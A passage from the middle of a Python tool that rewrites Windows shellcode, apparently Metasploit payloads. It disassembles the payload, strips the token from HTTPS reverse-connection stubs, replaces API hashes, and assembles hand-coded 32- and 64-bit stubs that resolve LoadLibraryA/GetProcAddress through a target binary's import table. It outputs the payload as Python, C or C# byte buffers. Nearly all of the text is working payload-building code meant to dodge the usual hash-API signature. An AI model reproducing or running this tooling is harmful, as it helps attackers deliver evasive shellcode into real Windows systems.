                self.mode = CS_MODE_64

        else:
            if not self.dontfail:
                sys.stderr.write("[!] No Hash API stub?? Quit! -n to override\n")
                sys.exit(-1)
            if self.mode == '':
                sys.stderr.write("[!] No mode selected for this mysterious code. ")
            sys.stderr.write("[!] No Hash API stub?? Continuing...\n")
            self.prestine_code = self.code

        # This Regex removes the token string in https reverse connections
        m = re.search(b'\xe8.{4}/(.*?)\x00', self.code)
        if m:
            
            self.replace_string = m.group()[5:]
            self.astring = b"\xcc" * (len(m.group()) - 5)
            self.code = re.sub(b'/(.*?)\x00', self.astring , self.code)
            sys.stderr.write("[*] Length of offending string: {0} \n".format(hex(len(self.astring))))
            sys.stderr.write("[*] Code length after URL replacement with '\\xcc' (breaks capstone disasm): {0}\n".format(hex(len(self.code))))
            sys.stderr.write(str(self.code))

    def fix_up_hardcoded_offsets(self):
        # 6/23 update for x64
        for key, value in self.tracker_dict.items():
            if value['ebp_offset_update'] and value['bytes'] == b'\x8d\x85\xb2\x00\x00\x00':
                offset_to_cmd = struct.pack("<I", len(self.jump_stub) + len(self.selected_payload) + len(self.stub) + 48 - 5)
                offset_to_cmd = b'\x8d\x85' + offset_to_cmd
                self.prestine_code = re.sub(b'\x8d\x85\xb2\x00\x00\x00', offset_to_cmd, self.prestine_code)

    def fix_up_mangled_hashes(self):
        for key, value in self.tracker_dict.items():

            if value['hash_update']:
                #sys.stderr.write("%s, %s\n" % (key, value))
                # Will need to do a register check here (mov )
                if len(value['bytes']) == 5:
                    self.prestine_code = self.prestine_code[:key+1] + struct.pack("<I", value['hash_update']) + self.prestine_code[key+5:]
                elif len(value['bytes']) ==6:
                    self.prestine_code = self.prestine_code[:key+2] + struct.pack("<I", value['hash_update']) + self.prestine_code[key+6:]
                else:
                    sys.stderr.write('WOT NOW M8?\n')
                    sys.exit(-1)
    
    def print_formats(self):
        '''
        Format the output prints to stdout
        '''
        if self.OUTPUT == 'p':
            # python output
            count = 0 
            print("buf = ''")
            while count < len(self.entire_payload):
                tmp=''
                print("buf += \"", end="")
                print(''.join('\\x{:02x}'.format(x) for x in self.entire_payload[count:count+13]), end="\"\n")
                count += 13

        elif self.OUTPUT == 'c':
            # c output
            count = 0 
            print("unsigned char buf[] =", end='')
            while count < len(self.entire_payload):
                print("\n\"", end="")
                print(''.join('\\x{:02x}'.format(x) for x in self.entire_payload[count:count+13]), end="\"")
                count += 13
            print(";")
 
        elif self.OUTPUT == 's':
            #csharp output
            count = 0 
            print("byte[] buf =new byte[{0}] {{".format(len(self.entire_payload)), end='')
            while count < len(self.entire_payload):
                print("\n", end="")
                print(''.join('0x{:02x},'.format(x) for x in self.entire_payload[count:count+13]), end="")
                count += 13
            print("};")
    
    def find_apis(self):
        locations = ['winXP', 'win7', 'win8', 'winVista', 'win10']
        ignore_dlls = ['api-ms-win', ]
        #ignore_dlls = []
        #goodtogo = {}
        loaded_modules = set()
        #self.dlls.add('emet.dll')
        temp_set = self.dlls
        if self.OS.lower() == 'all':
            look_here = locations
        else:
            look_here = [self.OS]

        for location in look_here:
            self.dlls = temp_set
            #goodtogo[location] = {}

            sys.stderr.write("[*] Checking %s compatibility\n" % location)
            _path_location = os.path.abspath(os.path.dirname(__file__))
            _location = _path_location + '/parser_output/' + location + '/output.json'
            #_included = './parser_output/' + location + '/included.json'
            all_dlls_dict = json.loads(open(_location, 'r').read())
            #included_dict = json.loads(open(_included, 'r').read())
            sys.stderr.write("[*] Number of lookups to do: {0}\n".format(len(all_dlls_dict)))
            # get all loaded modules
            def recursive_parse():
                # FML
                # list the dll that is imported by what dll
                # if it isn't already in the set print dll, imported name
                temp_lm = set()
                for dll in self.dlls:
                    sys.stderr.write("\t[*] Checking {0}'s imported DLLs:\n".format(dll.decode('ascii')))
                    for key, value in all_dlls_dict.items():
                        if dll.lower() == bytes(ntpath.basename(key.lower()), 'iso-8859-1'):
                            for lm in value['dlls']:
                                found = True
                                for ig_dll in ignore_dlls:
                                    
                                    if ig_dll.lower().encode('utf-8') in lm.lower().encode('utf-8'):
                                        
                                        found = False
                                if found is True and bytes(lm, 'iso-8859-1') not in temp_lm and bytes(lm, 'iso-8859-1') not in self.dlls:
                                    sys.stderr.write('\t\t [*] {0} adds the following not already loaded dll: {1}\n'.format(dll.decode('ascii'), lm))
                                    if type(lm) == bytes:
                                        temp_lm.add(lm)
                                    else:
                                        temp_lm.add(bytes(lm, 'iso-8859-1'))

                return temp_lm

            temp_dict = {}
            while True:
                length = len(self.dlls)
                temp_dict = recursive_parse()
                self.dlls = self.dlls.union(temp_dict)
                if len(temp_dict) <= length:
                    sys.stderr.write("[*] Parsing imported dlls complete\n")
                    break


            sys.stderr.write("[*] Possible useful loaded modules: {0}\n".format(self.dlls))
            dllfound = False
            getprocaddress_dll = False
            
            for dll in self.dlls:
                sys.stderr.write('[*] Looking for loadliba/getprocaddr or just getprocaddr in %s\n' % dll)

                dllfound = False
                getprocaddress_dll = False
                gpa_dll_location = ''
                for key, value in all_dlls_dict.items():
                    #if ntpath.basename(key.lower()) in blacklist:
                    #    continue
                    if dll.lower() == bytes(ntpath.basename(key.lower()), 'iso-8859-1'):
                        if value['getprocaddress']:
                            if 'system32' in key.lower():
                                getprocaddress_dll = True
                                dll_location = value['getprocaddress']
                            elif 'program files' in key.lower():
                                getprocaddress_dll = True
                                dll_location = value['getprocaddress']
                            if getprocaddress_dll is True:
                                sys.stderr.write("\t-- GetProcAddress will work with this imported DLL: {0}\n".format(key))
                                self.hash(ntpath.basename(key.lower()))
                                # hash and where this DLL came from
                                if self.OS.lower() in ['win7', 'win8', 'win10']: 
                                    dll_location = value['getprocaddress']
                                else:
                                    dll_location = 'kernel32.dll'
                                self.gpa_hash_dict[ntpath.basename(key.lower())] = {'hash' : self.DLL_HASH, 
                                                                                        'importname': dll_location
                                                                                        }
                                getprocaddress_dll = False
                        
                        # This check makes sure that lla and gpa are both in kernel32 for optimization purposes 
                        if value['loadlibrarya'] and value['getprocaddress'] and value['loadlibrarya'] == value['getprocaddress']:
                            if 'system32' in key.lower():
                                dllfound = True
                                break
                            #elif 'windows' in key.lower():
                            #    dllfound = True
                            #    break
                            elif 'program files' in key.lower():
                                dllfound = True
                                break
                            #else:
                            #    dllfound = True


                if dllfound is True:
                    #goodtogo[location][key] = value
                    sys.stderr.write("\t-- This imported DLL will work for LLA/GPA: {0}\n".format(key))
                    self.hash(ntpath.basename(key.lower()))
                    self.lla_hash_dict[ntpath.basename(key.lower())] = {'hash' : self.DLL_HASH, 
                                                                        'importname': dll_location
                                                                        }
                    
            sys.stderr.write("\n\n[*] LLA/GPA binaries available, use with -p ExternLLAGPA -d dllname.dll -l import_name:\n")
            for key, value in self.lla_hash_dict.items():
                sys.stderr.write("--DLL: {0}\n\tHash: {1}, Import Name: {2}\n".format(key, hex(value['hash']), value['importname']))
            sys.stderr.write("\n[*] GPA binaries available, use with -p ExternGPA -d dllname.dll -l import_name:\n")
            for key, value in self.gpa_hash_dict.items():
                sys.stderr.write("--DLL: {0}\n\tHash: {1}, Import Name: {2}\n".format(key, hex(value['hash']), value['importname']))

            if self.lla_gpa_found and self.gpa_found:
                sys.stderr.write("[*] You can use LLAGPA parser (-p LLAGPA)\n")

            if self.gpa_found:
                sys.stderr.write("[*] You can use GPA parser (-p GPA)\n")

            sys.stderr.write(("*" * 80) + "\n")
            
    def check_apis(self):
        ####################################
        #### Parse imports via pefile ######

        #make this option only if a IAT based shellcode is selected
        sys.stderr.write("[*] Loading PE in pefile\n")
        pe = pefile.PE(self.targetbinary, fast_load=True)
        sys.stderr.write("[*] Parsing data directories\n")
        pe.parse_data_directories()
        apis = {}
        apis['neededAPIs'] = set()
        self.dlls = set()
        self.lla_gpa_found = False
        self.gpa_found = False

        try:
            for api in ['LoadLibraryA', 'GetProcAddress']:
                apiFound = False
                for entry in pe.DIRECTORY_ENTRY_IMPORT:
                    if type(entry.dll) == bytes:
                        self.dlls.add(entry.dll)
                    else:
                        self.dlls.add(bytes(entry.dll, 'iso-8859-1'))
                    for imp in entry.imports:
                        if imp.name is None:
                            continue
                        if imp.name.lower() == bytes(api.lower(), 'iso-8859-1'):
                            sys.stderr.write("[*] Found API: {0}\n".format(api.lower()))
                            apiFound = True
                
                if apiFound is False:
                    apis['neededAPIs'].add(api)
                
        except Exception as e:
            sys.stderr.write("Exception: {0}\n".format(str(e)))

        if apis['neededAPIs'] == set():
            sys.stderr.write('[*] Both LLA/GPA APIs found!\n')
            self.lla_gpa_found = True
            self.gpa_found = True
        
        elif 'LoadLibraryA' in apis['neededAPIs']:
            sys.stderr.write('[*] GetProcAddress API was found!\n')
            self.gpa_found = True
        
    def decision_tree(self):
        if self.mode == CS_MODE_32:
            self.stubs = stubs_32(self)
        else:
            self.stubs = stubs_64(self)

        if self.parser_stub.lower() == 'OffsetGPA'.lower():
            self.check_apis()
            self.hash(self.dll)
            self.DLL_INFO = {'hash': self.DLL_HASH, 'importname': 'main_module'}
            sys.stderr.write("[*] Using OffsetGPA from {0} hash: {1}, import name: {2}\n".format(self.dll, hex(self.DLL_INFO['hash']),
                self.DLL_INFO['importname']))
            self.selected_payload = self.stubs.OffsetGPA()

        elif self.parser_stub.lower() == 'ExternOffsetGPA'.lower():
            self.check_apis()
            self.hash(self.dll)
            self.DLL_INFO = {'hash': self.DLL_HASH, 'importname': 'main_module'}
            sys.stderr.write("[*] Using ExternOffsetGPA from {0} hash: {1}, import name: {2}\n".format(self.dll, hex(self.DLL_INFO['hash']),
                self.DLL_INFO['importname']))
            self.selected_payload = self.stubs.ExternOffsetGPA()

        elif self.parser_stub.lower() == 'ExternGPAFC'.lower():
            self.hash(self.dll)
            self.DLL_INFO = {'hash': self.DLL_HASH, 'importname': 'kernelbase.dll'}
            sys.stderr.write("[*] Using ExternGPAFC from {0} hash: {1}, import name: {2}\n".format(self.dll, hex(self.DLL_INFO['hash']),
                self.DLL_INFO['importname']))
            self.selected_payload = self.stubs.loaded_gpafc_iat_parser_stub()

        elif self.targetbinary == '' and self.dll == '':
            if self.parser_stub.lower() == 'GPA'.lower():
                sys.stderr.write("[*] Using GPA Stub\n")
                self.selected_payload = self.stubs.gpa_parser_stub()
                self.DLL_INFO  = { 'hash': self.DLL_HASH, 'importname': 'main_module' }
            elif self.parser_stub.lower() == 'LLAGPA'.lower():
                sys.stderr.write("[*] Using LLAGPA Stub\n")
                self.selected_payload = self.stubs.lla_gpa_parser_stub()
                self.DLL_INFO  = { 'hash': self.DLL_HASH, 'importname': 'main_module' }
            else:
                sys.stderr.write("[!] Try providing a targetbinary (-b) or check your parser_stub option (-p)\n")
                sys.exit(-1)

        elif self.dll !="":
            sys.stderr.write("[*] You know your DLL target! Using {0} hash.\n".format(self.dll))
            if self.parser_stub.lower() == 'GPA'.lower() or self.parser_stub.lower() == 'ExternGPA'.lower():
                # set hash
                self.hash(self.dll)
                self.DLL_INFO = {'hash': self.DLL_HASH, 'importname': self.importname}
                sys.stderr.write("[*] Using ExternGPA from {0} hash: {1}, import name: {2}\n".format(self.dll, hex(self.DLL_INFO['hash']),
                    self.DLL_INFO['importname']))
                self.selected_payload = self.stubs.loaded_gpa_iat_parser_stub()
            elif self.parser_stub.lower() == 'ExternLLAGPA'.lower():
                self.hash(self.dll)
                self.DLL_INFO = {'hash': self.DLL_HASH, 'importname': self.importname}
                sys.stderr.write("[*] Using ExternLLAGPA from {0} hash: {1}, import name: {2}\n".format(self.dll, hex(self.DLL_INFO['hash']),
                    self.DLL_INFO['importname']))
                self.selected_payload = self.stubs.loaded_lla_gpa_parser_stub()
            else:
                sys.stderr.write("[!] Check your provided parser_stub option (-p)\n")
                sys.exit(-1)
        
        elif self.targetbinary !="":
            sys.stderr.write('[*] targetbinary submitted: {0} for {1} OS\n'.format(self.targetbinary, self.OS))
            # Check APIS then find apis
            self.check_apis()
            self.find_apis()
            
            if self.lla_gpa_found is True and self.parser_stub != 'GPA' and 'extern' not in self.parser_stub.lower():
                sys.stderr.write("[*] Using LLAGPA stub\n")
                self.selected_payload = self.stubs.lla_gpa_parser_stub()
                self.DLL_INFO  = { 'hash': self.DLL_HASH, 'importname': 'main_module' }
            
            elif self.gpa_found is True and self.parser_stub != 'LLAGPA' and 'extern' not in self.parser_stub.lower():
                sys.stderr.write("[*] Using GPA stub\n")
                self.DLL_INFO  = { 'hash': self.DLL_HASH, 'importname': 'main_module' }
                self.selected_payload = self.stubs.gpa_parser_stub()

            elif self.lla_hash_dict != {} and self.parser_stub != 'ExternGPA':
                DLL, self.DLL_INFO = random.choice(list(self.lla_hash_dict.items()))
                sys.stderr.write("[!] Using ExternLLAGPA from {0}, hash: {1}, import name: {2}\n".format(DLL, hex(self.DLL_INFO['hash']), 
                    self.DLL_INFO['importname']))
                self.selected_payload = self.stubs.loaded_lla_gpa_parser_stub()
            
            elif self.gpa_hash_dict != dict():
                DLL, self.DLL_INFO = random.choice(list(self.gpa_hash_dict.items()))
                sys.stderr.write("[!] Using ExternGPA from {0}, hash {1}, hash {2}\n".format(DLL, hex(self.DLL_INFO['hash']), 
                    self.DLL_INFO['importname']))
                
                self.selected_payload = self.stubs.loaded_gpa_iat_parser_stub()
                # use that
            else:
                sys.stderr.write("[!] You have no options... :( \n")
                sys.exit()


    def block_tracker(self):
        '''
        This is really for finding APIs....
        1st pass, find apis, put them in a string
        2nd pass, call engine.inspect_block
        '''
        current_block = ''
        
        for a_block in self.block_order:
            ebx = ''  # To track exit function
            ebp = ''
            rbp = ''
            rbx = ''
            r10d = ''
            call_op = ''
            jne_op = ''
            prior_key = ''
            
            tmp_block = OrderedDict({})
            
            for key, value in self.tracker_dict.items():

                if value['blocktag'] == a_block:
                    
                    tmp_block[key] = value
                
                    #if value['bytes'] == '\xc3':
                        

                    if value['mnemonic'] + " " + value['op_str'] == u"call ebp": #call ebp
                        
                        # TODO: SEE BELOW find values of push ebx and and push XXXXXX
                        if self.tracker_dict[prior_key]['mnemonic'] + " " + self.tracker_dict[prior_key]['op_str'] == "push ebx": # push ebx
                            
                            called_api, newhash = self.get_hash(ebx)
                            #self.tracker_dict[prior_key]['hash_update'] = newhash

                            
                            if called_api == None:
                                continue
                            #elif 'LoadLibraryA'.lower() not in called_api.lower() and buildcode is True: 
                            #    continue
                        elif self.tracker_dict[prior_key]['mnemonic']  == 'push': # push XXXXX
                            
                            called_api, newhash = self.get_hash(ebp)
                            self.tracker_dict[prior_key]['hash_update'] = newhash
                            
                            #if newhash:

                            if called_api == None:
                                continue
                            #elif 'LoadLibraryA'.lower() not in called_api.lower() and buildcode is True: 
                            #    continue

                    elif 'mov ebx' in value['mnemonic'] + " " + value['op_str']: # mov ebx ?
                        
                        
                        if len(value['bytes']) == 5:
                            ebx = hex(struct.unpack("<I", value['bytes'][1:])[0])
                        
                        #PROBABLY DON'T NEED THIS: TODO
                        called_api, newhash = self.get_hash(ebx)
                        self.tracker_dict[key]['hash_update'] = newhash
                        

                    elif 'mov r10d' in value['mnemonic'] + " " + value['op_str']:
                        #sys.stderr.write('mov r10d \n')
                        #sys.stderr.write(value['mnemonic'], "+", value['op_str'], "bytes:", value['bytes'], len(value['bytes']))
                        if len(value['bytes']) == 6:
                            r10d = hex(struct.unpack("<I", value['bytes'][2:])[0])

                        called_api, newhash = self.get_hash(r10d)
                        self.tracker_dict[key]['hash_update'] = newhash

                    elif 'mov r10' in value['mnemonic'] + " " + value['op_str']:
                        #sys.stderr.write('mov r10d \n')
                        #sys.stderr.write(value['mnemonic'], "+", value['op_str'], "bytes:", value['bytes'], len(value['bytes']))
                        if len(value['bytes']) == 7:
                            r10d = hex(struct.unpack("<I", value['bytes'][3:])[0])

                        called_api, newhash = self.get_hash(r10d)
                        self.tracker_dict[key]['hash_update'] = newhash

                    elif 'movabs r10' in value['mnemonic'] + " " + value['op_str']:
                        #sys.stderr.write('movabs r10d \n')
                        if len(value['bytes']) == 10:
                            r10d = hex(struct.unpack("<I", value['bytes'][2:6])[0])

                        called_api, newhash = self.get_hash(r10d)
                        self.tracker_dict[key]['hash_update'] = newhash

                    elif value['mnemonic'] == 'push' and len(value['bytes']) > 1: # push
                        ebp = value['op_str']
                    
                    elif value['mnemonic'] == 'call': #call
                        # I DON'T THINK I NEED THIS ANYMORE
                        
                        call_op = value['op_str']
                        called_api, newhash = self.get_hash(call_op)
                        self.tracker_dict[key]['hash_update'] = newhash
                        
                        #if buildcode is True:
                        #    self.engine.inspect_block(tmp_block, called_api)
                        continue
                    
                    elif 'jmp' in value['mnemonic']:
                        
                        call_op = value['op_str']
                        called_api, newhash = self.get_hash(call_op)
                        self.tracker_dict[key]['hash_update'] = newhash
                        
                        
                    elif 'ret' in value['mnemonic']:
                        
                        call_op = value['op_str']
                        called_api, newhash = self.get_hash(call_op)
                        
                        continue
                        
                    prior_key = key

    def doit(self):
        
        sys.stderr.write("[*] Disassembling payload\n")
        
        
        
        try:
            md = Cs(self.arch, self.mode)
            md.detail = True

            if self.syntax != 0:
                md.syntax = self.syntax

            tmp_tracker = []
            tmp_string = b''
            
            # init tmp
            tmp = {}
            #initialize blocktag
            blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
            
            # this is needed for http(s) payloads
            md.skipdata = True
            
            for insn in md.disasm(self.code, 0):
                
                #width = 50 - len(''.join('\\x{:02x}'.format(x) for x in insn.bytes))
                #sys.stderr.write("%s: %s\" %s %s %s\n" % (hex(insn.address), ''.join('\\x{:02x}'.format(x) for x in insn.bytes), '#'.rjust(width), insn.mnemonic, insn.op_str))

                tmp_tracker.append([insn.bytes, insn.mnemonic, insn.op_str])
                tmp = {'bytes': insn.bytes,
                       'mnemonic': insn.mnemonic, 
                       'op_str': insn.op_str,
                       'controlFlowTag': None,
                       'blocktag': blocktag,
                       'ebp_offset_update': False,   # True /False
                       'rbp_offset_update': False,
                       'hash_update': None,          # Populate with the actual value
                       }
                
                self.tracker_dict[insn.address] = tmp
                
                if insn.mnemonic + " " + insn.op_str == 'call ebp':
                    
                    
                 
                    self.tracker.append(tmp_tracker)
                    # set new blocktag
                    tmp_tracker=[] 
                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    
                elif insn.mnemonic + ' ' + insn.op_str == 'call rbp':
                    self.tracker.append(tmp_tracker)
                    # set new blocktag
                    tmp_tracker=[] 
                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    
                elif insn.mnemonic == "call":
                    
                    if tmp_tracker[len(tmp_tracker)-1] == 0x68:
                        sys.stderr.write("Found server_uri, string \n")
                    self.tracker.append(tmp_tracker)
                    tmp_tracker = []
                    #new blocktag
                    self.tracker_dict[insn.address]['controlFlowTag'] = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    # is the call in the positive or negative?
                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    
                elif 'jmp' in insn.mnemonic:
                    
                    #''.join(random.choice(string.ascii_lowercase[6:]+string.ascii_uppercase[6:]) for _ in range(8))
                    #''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    self.tracker.append(tmp_tracker)
                    tmp_tracker = []
                    # new blocktag
                    self.tracker_dict[insn.address]['controlFlowTag'] = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    # is the jmp postive or negative
                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                
                elif 'ret' in insn.mnemonic:
                    
                    self.tracker.append(tmp_tracker)
                    tmp_tracker = []
                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                
                elif 'j' in insn.mnemonic:
                    
                    self.tracker_dict[insn.address]['controlFlowTag'] = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                
                if '[rbp' in insn.op_str:
                    sys.stderr.write("Found a hardcoded offset for Stephen Fewers hash API reference \n")
                    self.tracker_dict[insn.address]['rbp_offset_update'] = True

                if '[ebp' in insn.op_str:
                    
                    self.tracker_dict[insn.address]['ebp_offset_update'] = True

                if blocktag not in self.block_order:
                    self.block_order.append(blocktag)
                

        except Exception as e:
            sys.stderr.write("ERROR: %s\n" % e)
            sys.exit(-1)

        
        # Identify the api being used.
        self.tracker_dict = OrderedDict(sorted(self.tracker_dict.items()))
        
        # Now find/assign controlFLowTags
        
        self.block_tracker()    
        
        sys.stderr.write("[*] Called APIs: {0}\n".format(self.called_apis))
                 
        # replace API hashes with mangled hashes
        self.fix_up_mangled_hashes()

        # make hash table
            
        tmp_bytes = b''

        for some_hash, api_lookup in self.api_hashes.items():
            tmp_bytes += struct.pack("<I", some_hash) + b"\x00\x00"

        # make string table
        string_set = set()
        for api in self.called_apis:
            string_set.add(api.split("!")[0].replace(".dll",''))
            string_set.add(api.split("!")[1])
        
        
        for api in string_set:
            self.string_table += api + "\x00"

        self.string_table = bytes(self.string_table, 'iso-8859-1')
        # put the hashes and string table together "\x00\x00\x00\x00" denotes end of hashes 
        
        # XOR table here... if you wanted... in the future... maybe pull request?
        
        sys.stderr.write("[*] String Table: {0}\n".format(self.string_table))
        
        self.lookup_table = tmp_bytes + self.string_table
        
        # FIND OFFSETS for the lookup_table and populate
        sys.stderr.write("[*] Building lookup table\n")
        for some_hash, api_lookup in self.api_hashes.items():
            m = re.search(re.escape(struct.pack("<I", some_hash)), self.lookup_table)
            aDLL = api_lookup.split("!")[0].replace(".dll",'')
            anAPI = api_lookup.split("!")[1]
            d = re.search(bytes(aDLL, 'iso-8859-1'), self.lookup_table)
            a = re.search(bytes(anAPI, 'iso-8859-1'), self.lookup_table)
            self.lookup_table = self.lookup_table[:m.start()+4] + struct.pack("B", d.start() - m.start()-4) + struct.pack("B", a.start() - m.start()-5) + self.lookup_table[m.start()+6:]
        
        self.decision_tree()

        # This is the stub that is appended to the IAT parser
        sys.stderr.write("[*] Assembling lookup table stub\n")
        if self.mode == CS_MODE_32:

            self.stub = b''
            self.stub += b"\xe9"
            self.stub += struct.pack("<I", len(self.lookup_table))
            
            self.stub += self.lookup_table

            table_offset = len(self.stub) - len(self.lookup_table)
            
            self.stub += b"\x33\xC0"                            # XOR EAX,EAX                    ; clear eax
            self.stub += b"\xE8\x00\x00\x00\x00"                # CALL $+5                       ; get PC
            self.stub += b"\x5E"                                # POP ESI                        ; current EIP loc in ESI                   
            self.stub += b"\x8B\x8E"                            # MOV ECX, DWORD PTR [ESI+XX]    ; MOV 1st Hash into ECX
            
            # updated offset
            updated_offset = 0xFFFFFFFF - len(self.stub) - table_offset + 14 
            
            # Check_hash
            self.stub += struct.pack("<I", 0xffffffff-len(self.stub) - table_offset + 14)
            self.stub += b"\x3B\x4C\x24\x24"                    # CMP ECX,DWORD PTR SS:[ESP+24]  ; check if hash in lookup table
            self.stub += b"\x74\x05"                            # JE SHORT 001C0191              ; if equal, jmp to found_a_match
            self.stub += b"\x83\xC6\x06"                        # ADD ESI,6                      ; else increment to next hash
            self.stub += b"\xEB\xEF"                            # JMP SHORT 001C0191             ; repeat
            # FOUND_A_MATCH
            self.stub += b'\x8B\x8E'                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; mov DLL offset to ECX
            self.stub += struct.pack("<I", updated_offset + 4)
            self.stub += b"\x8A\xC1"                            # MOV AL,CL                      ; OFFSET in CL, mov to AL
            # Get DLL and Call LLA for DLL Block
            self.stub += b"\x8B\xCE"                            # MOV ECX,ESI                    ; mov offset to ecx
            self.stub += b"\x03\xC8"                            # ADD ECX,EAX                    ; find DLL location
            self.stub += b"\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
            self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3))
            
            #sys.stderr.write("Test: {0}".format(self.DLL_INFO['importname']))
            if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
                self.stub += b"\x33\xC0"                        # XOR EAX,EAX
                self.stub += b"\x50"                            # PUSH EAX
                self.stub += b"\x51"                            # PUSH ECX                       ; push on stack for use
            
            elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
                self.stub += b"\x51"                            # PUSH ECX                       ; push on stack for use
            
            elif self.DLL_INFO['importname'].lower() == 'kernelbase.dll':
                self.stub += b"\x6A\x00"                        # Push 0
                self.stub += b"\x51"                            # PUSH ECX                       ; push on stack for use
        
            else:
                sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
                sys.exit(-1)
     
            
            self.stub += b"\xFF\x13"                            # CALL DWORD PTR DS:[EBX]        ; Call KERNEL32.LoadLibraryA (DLL)
            # Get API and Call GPA
            self.stub += b"\x8B\xD0"                            # MOV EDX,EAX                    ; Save DLL Handle to EDX
            if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
                self.stub += b"\x33\xC0"                        # XOR EAX,EAX                    ; Prep EAX for use
                self.stub += b"\x50"                            # push EAX
            elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'].lower() == 'kernelbase.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
                self.stub += b"\x33\xC0"                        # XOR EAX,EAX                    ; Prep EAX for use    
            else:
                sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
                sys.exit(-1)
            self.stub += b"\x8B\x8E"                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; Put API Offset in ECX
            self.stub += struct.pack("<I", updated_offset + 4)  
            self.stub += b"\x8A\xC5"                            # MOV AL,CH                      ; mov API offset to ECX
            self.stub += b"\x8B\xCE"                            # MOV ECX,ESI                    ; mov offset to ecx
            self.stub += b"\x03\xC8"                            # ADD ECX,EAX                    ; find API location
            self.stub += b"\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
            self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff + 4))
            self.stub += b"\x51"                                # PUSH ECX                       ; Push API on the stack
            self.stub += b"\x52"                                # PUSH EDX                       ; Push DLL handle on the stack
            self.stub += b"\xFF\x55\x00"                        # CALL DWORD PTR DS:[EBP]        ; Call Getprocaddress(DLL.handle, API)
            # Call API
            self.stub += b"\x89\x44\x24\x1C"                    # MOV DWORD PTR SS:[ESP+1C],EAX  ; SAVE EAX for popad ends up in eax
            self.stub += b"\x61"                                # POPAD                          ; Restore registers and call values
            self.stub += b"\x5D"                                # POP EBP                        ; get return addr
            self.stub += b"\x59"                                # POP ECX                        ; clear Hash API from msf caller 
            self.stub += b"\xFF\xD0"                            # CALL EAX                       ; call target API
            # Recover
            self.stub += b"\x55"                                # push ebp                       ; push return addr into msf caller
            self.stub += b"\xe8\x00\x00\x00\x00"                # call $+5                       ; get pc
            self.stub += b"\x5D"                                # POP EBP                        ; current EIP in EBP
            self.stub += b"\x81\xED"                            # SUB EBP,XX                     ; To reset the location of the api call back
            self.stub += struct.pack("<I", len(self.selected_payload)+ len(self.stub) -3)   
            self.stub += b"\xC3"                                # RETN                           ; return back into msf payload logic

            self.jump_stub = b"\xe8"
            self.jump_stub += struct.pack("<I", len(self.selected_payload) + len(self.stub))
        
        else:
            # 64 bit
           
            self.stub = b''
            self.stub += b"\xe9"
            self.stub += struct.pack("<I", len(self.lookup_table))
            
            self.stub += self.lookup_table

            table_offset = len(self.stub) - len(self.lookup_table)
            
            self.stub += b"\x33\xC0"                            # XOR EAX,EAX                    ; clear eax
            #GET PC
            self.stub += b"\x48\x8d\x35\x00\x00\x00\x00"        # lea rsi, [rip]
            self.stub += b"\x8B\x8E"                            # MOV ECX, DWORD PTR [RSI+XX]    ; MOV 1st Hash into ECX
            
            # updated offset
            updated_offset = 0xFFFFFFFF - len(self.stub) - table_offset + 13 
            
            # Check_hash
            self.stub += struct.pack("<I", 0xffffffff-len(self.stub) - table_offset + 13)
            self.stub += b"\x44\x39\xD1"                        # CMP ecx, r10d  
            
            self.stub += b"\x74\x06"                            # JE SHORT 001C01a1              ; if equal, jmp to found_a_match
            self.stub += b"\x48\x83\xC6\x06"                    # ADD RSI,6                      ; else increment to next hash
            # I think this is the right updated length
            self.stub += b"\xEB\xEF"                            # JMP SHORT 001C0191             ; repeat
            # FOUND_A_MATCH
            self.stub += b'\x8B\x8E'                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; mov DLL offset to ECX
            self.stub += struct.pack("<I", updated_offset + 4)
            self.stub += b"\x8A\xC1"                            # MOV AL,CL                      ; OFFSET in CL, mov to AL
            # Get DLL and Call LLA for DLL Block
            self.stub += b"\x48\x89\xF1"                        # MOV RCX,RSI                    ; mov offset to ecx
            self.stub += b"\x48\x01\xC1"                        # ADD RCX,RAX                    ; find DLL location
            self.stub += b"\x48\x81\xE9"                        # SUB RCX,XX                     ; normalize for ascii value
            self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3))
            
            #sys.stderr.write("Test: {0}".format(self.DLL_INFO['importname']))
            
            if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
                self.stub += b"\x48\x31\xD2"                        # XOR rdx,rdx

            elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
                # no need for pushing on stack
                self.stub += b""                                 # PUSH ECX                       ; push on stack for use
            
            elif self.DLL_INFO['importname'].lower() == 'kernelbase.dll':
